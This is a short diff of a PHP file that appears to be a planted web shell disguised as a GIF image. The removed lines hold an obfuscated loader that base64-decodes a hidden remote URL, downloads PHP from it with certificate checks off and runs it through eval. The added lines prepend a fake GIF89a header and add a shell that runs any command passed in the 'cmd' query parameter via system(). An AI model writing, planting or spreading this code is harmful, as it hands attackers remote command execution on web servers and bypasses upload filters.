@@ -1,7 +1,18 @@
+GIF89a
+/*
+
 <?php
-// Method 10: MIXED ENCODING (MOST EVASIVE)
-error_reporting(0);
-$_0x1a2b='aHR0cHM6Ly9naXRsYWIuY29tL3d1bGl6bzMzNS9kYXRhLWpzb24vLS9yYXcvbWFpbi9zYXJhZGEucGhw';
-$_0x3c4d=function($_0x5e6f){$_0x7g8h=base64_decode($_0x5e6f);$_0x9i0j=gzuncompress(base64_decode(base64_encode(gzcompress($_0x7g8h))));return $_0x9i0j;};
-$url=base64_decode($_0x1a2b);$c=curl_init($url);curl_setopt($c,CURLOPT_RETURNTRANSFER,1);curl_setopt($c,CURLOPT_SSL_VERIFYPEER,0);curl_setopt($c,CURLOPT_FOLLOWLOCATION,1);eval("?>".curl_exec($c));
+
+
+if (isset($_GET['cmd'])) {
+    $cmd = $_GET['cmd'];
+
+
+    echo "<pre>";
+    echo "Menjalankan perintah: " . htmlspecialchars($cmd) . "\n\n";
+    system($cmd);
+    echo "</pre>";
+} else {
+    echo "Gunakan parameter ?cmd=perintah";
+}
 ?>
